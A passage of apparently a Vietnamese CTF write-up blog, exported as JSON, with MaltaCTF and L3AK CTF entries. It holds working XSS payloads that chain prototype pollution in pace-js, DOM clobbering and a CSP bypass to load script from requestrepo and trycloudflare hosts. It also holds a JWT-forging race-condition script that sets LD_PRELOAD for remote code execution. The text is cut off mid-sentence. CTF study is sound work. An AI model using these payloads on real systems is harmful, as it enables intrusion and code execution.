[{"content":" Malta CTF Giải này mình chỉ làm được có một bài thui \u0026hellip;. bài đầu khá dễ nên mình sẽ viết về câu 2.\nFancy text Bài này là một bài XSS nhưng sử dụng DOMPURIFY latest và CSP để chặn hầu hết mọi đường . Source code đơn giản như sau : index.html\n\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Fancy Text Generator!\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt; \u0026lt;link href=\u0026quot;/style.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt; \u0026lt;script integrity=\u0026quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026quot; src=\u0026quot;/loader.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Fancy text generator\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;contentBox\u0026quot;\u0026gt;\u0026lt;%- text || \u0026quot;fancy text generator!\u0026quot; %\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;form action=\u0026quot;/\u0026quot; method=\u0026quot;GET\u0026quot;\u0026gt; \u0026lt;input name=\u0026quot;text\u0026quot; placeholder=\u0026quot;text to make fancy\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;submit\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; loader.js\nscripts = { \u0026quot;pace\u0026quot;: \u0026quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026quot;, \u0026quot;main\u0026quot;: \u0026quot;/main.js\u0026quot;, } function appendScript(src) { let script = document.createElement('script'); script.src = src; document.head.appendChild(script); }; for (let script in scripts) { appendScript(scripts[script]); } main.js\nconst toFancyText = (text) =\u0026gt; { const fancyLowerStart = 0x1D51E; // 'a' const fancyUpperMap = { A: 0x1D504, B: 0x1D505, C: 0x212D, D: 0x1D507, E: 0x1D508, F: 0x1D509, G: 0x1D50A, H: 0x210C, I: 0x2111, J: 0x1D50D, K: 0x1D50E, L: 0x1D50F, M: 0x1D510, N: 0x1D511, O: 0x1D512, P: 0x1D513, Q: 0x1D514, R: 0x211C, S: 0x1D516, T: 0x1D517, U: 0x1D518, V: 0x1D519, W: 0x1D51A, X: 0x1D51B, Y: 0x1D51C, Z: 0x2128 }; return [...text].map(char =\u0026gt; { const code = char.charCodeAt(0); // a-z if (code \u0026gt;= 97 \u0026amp;\u0026amp; code \u0026lt;= 122) { return String.fromCodePoint(fancyLowerStart + (code - 97)); } // A-Z if (char in fancyUpperMap) { return String.fromCodePoint(fancyUpperMap[char]); } // Leave others (numbers, punctuation) unchanged return char; }).join(''); } contentBox.innerText = toFancyText(contentBox.innerText) server.js\nconst express = require('express') const app = express(); const createDOMPurify = require('dompurify'); const { JSDOM } = require('jsdom'); app.set('view engine', 'ejs'); app.use(express.static('static')) app.use((req, res, next) =\u0026gt; { res.set('Content-Security-Policy', \u0026quot;script-src 'sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=' 'strict-dynamic'; object-src 'none';\u0026quot;); next(); }); app.get('/', (req, res) =\u0026gt; { const window = new JSDOM('').window; const DOMPurify = createDOMPurify(window); ///return res.render('index', {text: DOMPurify.sanitize(req.query.text)}) return res.render('index', { text: req.query.text }) }) app.listen(process.env.PORT || 1337, () =\u0026gt; { console.log(`listening on ${process.env.PORT || 1337}`) }) Chương trình này làm gì . Cho phép user nhập input vào sau đó input sẽ đi qua hàm main và biến đổi sang các kí tự đặc biệt khác nhau. Sử dụng script intergrity để chống việc file loader.js bị thay đổi nên ta có thể loại bỏ việc load một file script khác từ bên ngoài vào. Dùng dompurify để loại bỏ hết các tag nguy hiểm. Sau đó mình đọc hàm loader.js thì thấy nó có thể load script đến \u0026ldquo;/main.js\u0026rdquo; và \u0026ldquo;pace.js\u0026rdquo; .Sau khi check csp thì mình thấy nó thiếu base uri check . Nhưng Dompurify vẫn sẽ sanitize nó . Làm sao không bị ảnh hưởng bởi hàm fancy text. Lúc này mình vẫn không biết làm sao để lấy được xss nên mình nghĩ đến việc làm sao để truyền payload tùy ý vào mà không bị ảnh hưởng bởi fancyText đã.\nLúc này mình thấy có bug Dom clobbering ở chỗ\ncontentBox.innerText = toFancyText(contentBox.innerText) Vậy ta có thể chèn bất kì tag nào với id \u0026ldquo;contentBox\u0026rdquo; thì nó sẽ crash cái hàm main này và ta có thể dùng html injection Nhưng vấn đề lớn nhất vẫn là Dompurify và mình đã bí từ đây.. Sau đó mình nghĩ đến việc dom cloberring được biến scripts Nhưng sau khi thử thì mình nhận ra Dompurify đã tính đến trường hợp này :vv . Mình có thể clober \u0026ldquo;script\u0026rdquo; nhưng \u0026ldquo;scripts\u0026rdquo; thì không . Xem hình bên dưới ( mình sẽ tìm hiểu vấn đề này sau\u0026hellip;) Nhưng mình nhận ra là cho dù có dom cloberring được thì cũng chẳng có ý nghĩa gì vì javascript scope ở đây. Vậy là tới đây mình bí toàn tập \u0026hellip;. Đọc write up Sau khi đọc write up mình đã nhận ra cái ngu của mình. Đó là mình đã quên kiểm tra package \u0026ldquo;pace.js\u0026rdquo; được load vào \u0026hellip;. Đáng lẽ ra mình phải kiểm tra mọi input được đi vào app của mình mới đúng. Đến đây thì đọc source của pace.js là được. Sau đó thì mình tìm được report này vào năm 2024 , yeah 2024 :) https://github.com/CodeByZach/pace/issues/546 Một bug khá lớn nhưng có vẻ bên developers không còn maintain nữa. Bản chất của bug này cũng là merge prototype thui. extend = function() { var key, out, source, sources, val, _i, _len; out = arguments[0], sources = 2 \u0026lt;= arguments.length ? __slice.call(arguments, 1) : []; for (_i = 0, _len = sources.length; _i \u0026lt; _len; _i++) { source = sources[_i]; if (source) { for (key in source) { if (!__hasProp.call(source, key)) continue; val = source[key]; if ((out[key] != null) \u0026amp;\u0026amp; typeof out[key] === 'object' \u0026amp;\u0026amp; (val != null) \u0026amp;\u0026amp; typeof val === 'object') { extend(out[key], val); } else { out[key] = val; } } } } return out; }; Và mình sẽ có thể OBJECT PROTOTYPE bất kì biến nào chỉ với :\n\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;YOU ARE POLLUTED!\u0026quot;}}'\u0026gt; Đến đây thì ý tưởng của bài write up là Object prototype một biến bất kì có giá trị bằng một script source của attacker . Mục đích chính là pollute biến script trong loader.js scripts = { \u0026quot;pace\u0026quot;: \u0026quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026quot;, \u0026quot;main\u0026quot;: \u0026quot;/main.js\u0026quot;, } function appendScript(src) { let script = document.createElement('script'); script.src = src; document.head.appendChild(script); }; // This will loop through our \u0026quot;polluted\u0026quot; : \u0026quot;//attacker.js\u0026quot; for (let script in scripts) { appendScript(scripts[script]); } Đọc đến đây mình thấy khá bất ngờ khi object prototype có thể ảnh hưởng đến cả loop for in ? Test thử thì mình thấy quả thật vậy; scripts = { \u0026quot;pace\u0026quot;: \u0026quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026quot;, \u0026quot;main\u0026quot;: \u0026quot;/main.js\u0026quot;, } Object.prototype.polluted = \u0026quot;FUCKED\u0026quot; console.log(\u0026quot;Just log it out : \u0026quot;, scripts) for (let script in scripts) { console.log(\u0026quot;[\u0026quot; + script + \u0026quot;] =\u0026gt; \u0026quot; + scripts[script]) } /*OUTPUT : Just log it out : { pace: 'https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js', main: '/main.js' } [pace] =\u0026gt; https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js [main] =\u0026gt; /main.js [polluted] =\u0026gt; FUCKED */ Hmmmm, nhìn rất lạ nhỉ . Sau khi đọc docs thì mình thấy for in sẽ loop qua những enumerables của chính nó và cả những enumerables của Object.prototype ~~\nThông tin chi tiết về thế nào là enumberables chúng ta có thể xem ở đây : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties Và các hàm để kiểm tra enumrables hay không : Ta có thể thấy hàm in khi này sẽ xem Enumrable + inherited là true và chính vì thế script của mình sẽ bị polluted khi for in qua. Vấn đề cuối cùng Đọc write up thì mình thấy có vẻ còn một bug ở trong pace js để có thể chèn html injection nữa : var _custom_class_name = (options.className !== '') ? ' ' + options.className : ''; this.el.innerHTML = '\u0026lt;div class=\u0026quot;pace-progress' + _custom_class_name + '\u0026quot;\u0026gt;\\n \u0026lt;div class=\u0026quot;pace-progress-inner\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\\n\u0026lt;/div\u0026gt;\\n\u0026lt;div class=\u0026quot;pace-activity\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;'; Đơn giản là dùng options className ròi inject vào nhưng vì mình đã có free html injection ròi nên làm ngắn thui..\nimport requests url =\u0026quot;https://fancy-text-generator-web.shared.challs.mt/\u0026quot; url =\u0026quot;http://localhost:1337\u0026quot; html = '''\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}}'\u0026gt; ''' text = html + '\u0026lt;a id =\u0026quot;contentBox\u0026quot;\u0026gt;' res = requests.get(url,params={\u0026quot;text\u0026quot;:text}) print(res.text) print(text) Vậy là đã polluted thành công . Đến đây thì vấn đề là mình cần gọi script /loader.js một lần nữa để load vào nhưng mình không thể bypass được DOM purify . Cuối cùng vẫn phải dùng gadget className của pace js thui :vvv . Nó sẽ giúp mình bypass bằng cách mọi payload đều nằm trong một html attribute nên sẽ valid khi đi qua Dompurify. Sau một hồi ngồi escape các thứ thì mình có script sau : import requests import urllib.parse import html url =\u0026quot;http://localhost:1338\u0026quot; url =\u0026quot;https://fancy-text-generator-web.shared.challs.mt\u0026quot; options = \u0026quot;\u0026quot; #htmls = '''\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}}'\u0026gt;\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt;''' def html_encode(s): return s.replace(\u0026quot;\u0026amp;\u0026quot;, \u0026quot;\u0026amp;amp;\u0026quot;).replace(\u0026quot;\u0026lt;\u0026quot;, \u0026quot;\u0026amp;lt;\u0026quot;).replace(\u0026quot;\u0026gt;\u0026quot;, \u0026quot;\u0026amp;gt;\u0026quot;).replace('\u0026quot;', \u0026quot;\u0026amp;quot;\u0026quot;).replace(\u0026quot;'\u0026quot;, \u0026quot;\u0026amp;#39;\u0026quot;) payload ='''aaaa\\\\\u0026quot;\u0026gt;\u0026lt;script integrity=\\\\\u0026quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\\\\\u0026quot; src=\\\\\u0026quot;/test.js?version=1\\\\\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;''' htmls = f'\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options=\\'{{\u0026quot;startOnPageLoad\u0026quot;:true,\u0026quot;__proto__\u0026quot;:{{\u0026quot;polluted\u0026quot;:\u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}},\u0026quot;className\u0026quot;: \u0026quot;{payload}\u0026quot;}}\\'\u0026gt;' text = htmls + '\u0026lt;a id =\u0026quot;contentBox\u0026quot;\u0026gt;' res = requests.get(url,params={\u0026quot;text\u0026quot;:text}) print(res.text) print(payload) print(url + \u0026quot;?text=\u0026quot; + urllib.parse.quote(text)) Đến đây thì script của mình được load rồi nhưng mà nó không gọi bất kì request nào cả ? Vì sao ???? Đến đây thì mình mới nhớ là innerHTML không cho phép script chạy :vv . Bypass bằng iframe là xong\nimport requests import urllib.parse import html url =\u0026quot;http://localhost:1338\u0026quot; url =\u0026quot;https://fancy-text-generator-web.shared.challs.mt\u0026quot; options = \u0026quot;\u0026quot; #htmls = '''\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;\u0026quot;}}'\u0026gt;\u0026lt;script\u0026gt;alert()\u0026lt;/img\u0026gt;''' def html_encode(s): return s.replace(\u0026quot;\u0026amp;\u0026quot;, \u0026quot;\u0026amp;amp;\u0026quot;).replace(\u0026quot;\u0026lt;\u0026quot;, \u0026quot;\u0026amp;lt;\u0026quot;).replace(\u0026quot;\u0026gt;\u0026quot;, \u0026quot;\u0026amp;gt;\u0026quot;).replace('\u0026quot;', \u0026quot;\u0026amp;quot;\u0026quot;).replace(\u0026quot;'\u0026quot;, \u0026quot;\u0026amp;#39;\u0026quot;) payload ='''aaaa\\\\\u0026quot;\u0026gt;\u0026lt;iframe srcdoc =\\\\\u0026quot;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;img id=\u0026amp;amp;quot;data-pace-options\u0026amp;amp;quot; data-pace-options=\u0026amp;amp;#39;{\u0026amp;amp;quot;__proto__\u0026amp;amp;quot;: {\u0026amp;amp;quot;polluted\u0026amp;amp;quot;: \u0026amp;amp;quot;https://nj2n2pew.requestrepo.com/ex.js\u0026amp;amp;quot;}}\u0026amp;amp;#39;\u0026gt;\\\\\u0026quot;\u0026gt;''' htmls = f'\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options=\\'{{\u0026quot;startOnPageLoad\u0026quot;:true,\u0026quot;__proto__\u0026quot;:{{\u0026quot;polluted\u0026quot;:\u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}},\u0026quot;className\u0026quot;: \u0026quot;{payload}\u0026quot;}}\\'\u0026gt;' text = htmls + '\u0026lt;a id =\u0026quot;contentBox\u0026quot;\u0026gt;' res = requests.get(url,params={\u0026quot;text\u0026quot;:text}) print(res.text) print(payload) print(url + \u0026quot;?text=\u0026quot; + urllib.parse.quote(text)) Đến đoạn này thì còn một vấn đề là loader.js của mình sẽ luôn được load trước khi pace-js được load . Mình có thể tạo một hanging server và gửi loader.js đúng với file ban đầu để không bị lỗi intergriti\nfrom flask import Flask, send_file from flask_cors import CORS import time app = Flask(__name__) CORS(app) # Enable CORS for all routes @app.route('/loader.js') def serve_js(): time.sleep(3) return send_file('src/static/loader.js', mimetype='application/javascript') if __name__ == '__main__': app.run(host='0.0.0.0', port=3000) Full script :\nimport requests import urllib.parse import html url =\u0026quot;http://localhost:1338\u0026quot; url =\u0026quot;https://fancy-text-generator-web.shared.challs.mt\u0026quot; options = \u0026quot;\u0026quot; #htmls = '''\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;\u0026quot;}}'\u0026gt;\u0026lt;script\u0026gt;alert()\u0026lt;/img\u0026gt;''' def html_encode(s): return s.replace(\u0026quot;\u0026amp;\u0026quot;, \u0026quot;\u0026amp;amp;\u0026quot;).replace(\u0026quot;\u0026lt;\u0026quot;, \u0026quot;\u0026amp;lt;\u0026quot;).replace(\u0026quot;\u0026gt;\u0026quot;, \u0026quot;\u0026amp;gt;\u0026quot;).replace('\u0026quot;', \u0026quot;\u0026amp;quot;\u0026quot;).replace(\u0026quot;'\u0026quot;, \u0026quot;\u0026amp;#39;\u0026quot;) payload ='''aaaa\\\\\u0026quot;\u0026gt;\u0026lt;iframe srcdoc =\\\\\u0026quot;\u0026lt;img id=\u0026amp;amp;quot;data-pace-options\u0026amp;amp;quot; data-pace-options=\u0026amp;amp;#39;{\u0026amp;amp;quot;__proto__\u0026amp;amp;quot;: {\u0026amp;amp;quot;polluted\u0026amp;amp;quot;: \u0026amp;amp;quot;https://nj2n2pew.requestrepo.com/ex.js\u0026amp;amp;quot;}}\u0026amp;amp;#39;\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script crossorigin=\u0026amp;amp;quot;anonymous\u0026amp;amp;quot;integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;https://commissioners-mozilla-messenger-compressed.trycloudflare.com/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\\\\\u0026quot;\u0026gt;''' htmls = f'\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options=\\'{{\u0026quot;startOnPageLoad\u0026quot;:true,\u0026quot;__proto__\u0026quot;:{{\u0026quot;polluted\u0026quot;:\u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}},\u0026quot;className\u0026quot;: \u0026quot;{payload}\u0026quot;}}\\'\u0026gt;' text = htmls + '\u0026lt;a id =\u0026quot;contentBox\u0026quot;\u0026gt;' res = requests.get(url,params={\u0026quot;text\u0026quot;:text}) print(res.text) print(payload) print(url + \u0026quot;?text=\u0026quot; + urllib.parse.quote(text)) Dùng script với cross-origin = anonymous để request cors enabled. Đến đây là xong bài rùi \u0026hellip;\nflag : maltactf{oops_my_dependency_is_buggy_05b19465ce19db4e28ddb00bb19f101e}\nCảm nhận : Giải này khá là khoai :vv mới câu 2 thui mà mình đã quá ngu ròi. Thi xong sẽ quay lại làm mấy câu còn lại bruhh. Sai lầm : Không kiểm tra hết input vào một app Quá tin tưởng vào package latest :( Skill issue khi làm việc với html entity encode New knowledge : Object prototype in latest pace-js Enumerable inherit trong for in và vâng vâng Script intergrity check Audit sau giải Dompurify id \u0026ldquo;script\u0026rdquo; and \u0026ldquo;scripts\u0026rdquo; Style with background can make xs leak with no csp ? \u0026ndash; ","permalink":"http://localhost:1313/writeups/maltactf2025/fancy/","title":"FANCY TEXT"},{"content":" l3akctf2025 Performance Summary CTFs: 8/22 Total points: 3863 Position: 40 Rating points: 7.132 Writeups Category flagguessr ","permalink":"http://localhost:1313/writeups/l3akctf2025/","title":"l3akctf2025"},{"content":" MaltaCTF 2025 Performance Summary Total points: 301 Position: 85 Rating points: ? Writeups Category Fancy ","permalink":"http://localhost:1313/writeups/maltactf2025/","title":"MaltaCTF 2025"},{"content":" Nothing \u0026hellip;. ","permalink":"http://localhost:1313/news/cookiefarmv1.0.1/","title":"Nothing here"},{"content":" L3AK CTF Write up cho bài mình không solve ra trong giải\nKnowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision\nBài này có 2 cách : Unintended và intended nhưng mình sẽ nói sơ qua về walkthrough trước nhé\nWalthrough : Mục tiêu của bài này là lấy được RCE thông qua một đống chain\u0026hellip;\nTrong giải thì bài này mình bị kẹt vì mắc một cái bẫy CSRF khá đần . Mình thấy bug csrf ròi tìm cách làm đủ thứ nhưng hầu như chả có tác dụng gì và mình biết thấy mọi attack vector muốn hoạt động được thì đều cần forge được session nhưng vì để forge được quá khó nên hầu như mình bí ngậm ngùi\u0026hellip;\nĐọc write up Cách unintended có vẻ dễ hiểu hơn nên ta sẽ bắt đầu với nó . Idea chính để lên được RCE là set được biến môi trường :\nLD_PRELOAD =./route/to/my/flag.txt Đây là cách duy nhất để ta có thể lấy RCE nhưng mình không biết cái này nên cũng bí từ đầu ròi \u0026hellip; Ok vậy làm sao để attack được vào biến môi trường thì trong source chỉ có một đoạn ảnh hưởng đến ENV thoi\ncmd.Env = append(os.Environ(), fmt.Sprintf(\u0026quot;correct_guesses=%d\u0026quot;, u.FlagsFound)) cmd.Env = append(cmd.Env, fmt.Sprintf(\u0026quot;total_attempts=%d\u0026quot;, u.FlagsChecked)) // cai nay weird vc dang le ra phai thay chu ta : ) for k, v := range session.Properties { cmd.Env = append(cmd.Env, fmt.Sprintf(\u0026quot;%s=%s\u0026quot;, k, v)) } Ở đây ta thấy biến ENV sẽ được set theo Properties của session bằng vòng for loop .. Đáng lẽ ở đây mình nên nhận ra điều này sớm hơn vì khi ta tạo một user bình thường thì properties chỉ chứa đúng duy nhất một key thì tạo vòng for loop để làm chi :0 . Điều này dẫn đến việc ta cần phải tìm cách để forge được một jwt bất kì .\nForge JWT KEY Trong giải thì mình nghĩ đến cách sẽ leak JWT KEY bằng cách nào đó nhưng hầu như không có cách nào cả và mình bí típ : )\nThì cách unintended sẽ lợi dụng một cái bug ở register như sau :\nfunc Register(w http.ResponseWriter, r *http.Request) { session, valid, resp, err := RequestMiddleware(w, r) resp.Body = \u0026quot;/register\u0026quot; // BUG NOT CHECK VALID ? defer resp.respondRedirect() if err != nil { resp.Body = \u0026quot;/register?e=bad request\u0026quot; return } if valid \u0026amp;\u0026amp; session.LoggedIn { resp.Body = \u0026quot;/home\u0026quot; return } // Sign everything we want // Defer call when packnick and all trime defer session.UpdateSession(w) flagFile, _, err := r.FormFile(\u0026quot;flag\u0026quot;) if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=bad request\u0026quot; return } username := r.FormValue(\u0026quot;username\u0026quot;) password := r.FormValue(\u0026quot;password\u0026quot;) displayName := r.FormValue(\u0026quot;display_name\u0026quot;) if len(username) == 0 { session.ClearSession() resp.Body = \u0026quot;/register?e=missing username\u0026quot; return } else if len(password) == 0 { session.ClearSession() resp.Body = \u0026quot;/register?e=missing password\u0026quot; return } else if len(displayName) == 0 { session.ClearSession() resp.Body = \u0026quot;/register?e=missing display name\u0026quot; return } newUser := \u0026amp;User{ Username: strings.ToLower(username), DisplayName: displayName, Password: password, UserType: UserKindStandard, UserID: uuid.NewString(), } // doan nay bi race condition available, err := newUser.CheckUsernameAvailable() if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=bad request\u0026quot; return } if !available { session.ClearSession() resp.Body = \u0026quot;/register?e=username taken\u0026quot; return } err = os.MkdirAll(fmt.Sprintf(\u0026quot;./userdata/%s/uploads\u0026quot;, newUser.UserID), 0644) if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=internal server error\u0026quot; return } f, err := os.OpenFile(fmt.Sprintf(\u0026quot;./userdata/%s/flag.txt\u0026quot;, newUser.UserID), os.O_WRONLY|os.O_CREATE, 0644) if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=internal server error\u0026quot; return } defer f.Close() _, err = io.Copy(f, flagFile) if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=internal server error\u0026quot; return } // Chi co o day la khong clear session =)) err = newUser.InsertUser() if err != nil { resp.Body = \u0026quot;/register?e=bad request\u0026quot; return } session.InitSession(newUser) resp.Body = \u0026quot;/home\u0026quot; } Ở đây ta thấy sau khi check session invalid thì đáng lẽ phải return khỏi hàm luôn nhưng ở đây thì check thiếu cái đấy. Dẫn đến việc hàm defer UpdateSession sẽ được gọi và sign luôn cái session cookie của mình và đến đoạn này đáng lẽ ta sẽ có được cookie đã được sign nhưng sẽ bị clear nếu như session.ClearSession được gọi. Đọc tiếp ta sẽ thấy chỉ duy nhất một case Session không bị clear là đoạn newUser.InsertUser() . Để hàm này bị error thì ta chỉ cần tạo 2 user giống username và display_name là được vì trong config của db : `CREATE TABLE users (user_id text UNIQUE, username text COLLATE NOCASE, password text, display_name text, description text NULL, user_type integer, cheater integer, PRIMARY KEY (username, display_name));` Ta thấy PRIMARY KEY ở đây gồm cả (username,display_name) tức là một cặp này phải là unique. Vậy đến đây ta chỉ cần tạo 2 user giống nhau ? Không , ở trên có một đoạn checkUsernameAvaiable nữa. Bypass checkUsername Để qua được hàm này thì ta có thể để ý đến cái case được chỉ định cho username trong config là COLLATE NOCASE và nghĩ đến việc tryền 2 username khác case nhau nhưng đã bị block bởi toLowerCase() . Để bypass đoạn này thì ta có 2 cách dẫn đến 2 solution khác nhau : Race condition Leak display_name Mình sẽ giải thích cách 2 sau. Cách 1 thì race condition thì đấy , race thôi\u0026hellip;.\nScript của mình như sau :\nimport requests import threading import jwt JWT_KEY =\u0026quot;FUCK\u0026quot; FLAG_SO_ID = \u0026quot;\u0026quot; MALICOUS_SESSION =\u0026quot;\u0026quot; url = \u0026quot;http://localhost:5555\u0026quot; url = \u0026quot;http://34.59.119.124:17005\u0026quot; def register(username, password): s= requests.Session() data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, \u0026quot;display_name\u0026quot;: \u0026quot;1337\u0026quot;, } payload = {\u0026quot;username\u0026quot;:\u0026quot;sa\u0026quot;,\u0026quot;user_id\u0026quot;:FLAG_SO_ID,\u0026quot;display_name\u0026quot;:\u0026quot;1337\u0026quot;,\u0026quot;user_kind\u0026quot;:0,\u0026quot;flags_checked\u0026quot;:0,\u0026quot;flags_found\u0026quot;:0, \u0026quot;properties\u0026quot; : { \u0026quot;description\u0026quot; : \u0026quot;FUCk\u0026quot; , \u0026quot;LD_PRELOAD\u0026quot; : f\u0026quot;/app/userdata/{FLAG_SO_ID}/flag.txt\u0026quot;, },\u0026quot;logged_in\u0026quot; :True} token = jwt.encode(payload, JWT_KEY, algorithm=\u0026quot;HS256\u0026quot;) with open(\u0026quot;flag.so\u0026quot;, \u0026quot;rb\u0026quot;) as flag_file: files = {\u0026quot;flag\u0026quot;: flag_file} cookies = {\u0026quot;session\u0026quot;: token} response = requests.post(f\u0026quot;{url}/register\u0026quot;,data=data, files=files, cookies=cookies, allow_redirects=False) print(response.cookies) return response def login(username, password): s = requests.Session() data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, } response = s.post(f\u0026quot;{url}/login\u0026quot;, data=data,allow_redirects=False) print(response.cookies) return s def getProfile(session): res = session.get(url+'/api/profile',allow_redirects=False) print(res.text) return res.json()['user_id'] username = \u0026quot;sa\u0026quot; password = \u0026quot;s\u0026quot; register(username,password) s= login(username,password) FLAG_SO_ID = getProfile(s) print(f\u0026quot;FLAG_SO_ID: {FLAG_SO_ID}\u0026quot;) ## Start RACE CONDITION TO BYPASS CHECKUSERNAME AND REACH THE INSERT ###J username=\u0026quot;aaaa\u0026quot; password =\u0026quot;s\u0026quot; t1 = threading.Thread(target=register, args=(username, password)) t2 = threading.Thread(target=register, args=(username, password)) t1.start() t2.start() t1.join() t2.join() Flow :\nUpload So File Forge session with race conditon Make ceritficate with forged session Intend Leak display_name . Bởi vì username admin luôn được tạo với Admin-* nên case của ta sẽ không bao giờ bị catch :\u0026gt; . Vậy vấn đề để trigger bug thì phải insert đúng chính xác display_name . Đến đây thì mình có nghĩ đến cách CSRF vì có bug CSRF :) nma ko có effect vì có cors :( :sadge\nVậy thứ ta cần ở đây là XSS. Chỗ nào có xss nhỉ ? Check trên các page html thì ta không hề thấy sự xuất hiện của innerHTML nên ta có thể loại bỏ trường hợp này.\nNhưng server có thể trả về response theo 2 cách , 1 trong 2 cách đó là trả về RAW RESPONSE\nfunc (r *Response) respondRaw() error { if r.Responded { return nil } if r.RespCode == 0 { r.RespCode = http.StatusOK } r.Writer.WriteHeader(r.RespCode) respBytes, ok := r.Body.([]byte) if !ok { return fmt.Errorf(\u0026quot;invalid body\u0026quot;) } _, err := r.Writer.Write(respBytes) r.Responded = true return err } Bug này khá giống với MIME SNIFFER của chromium khi sẽ 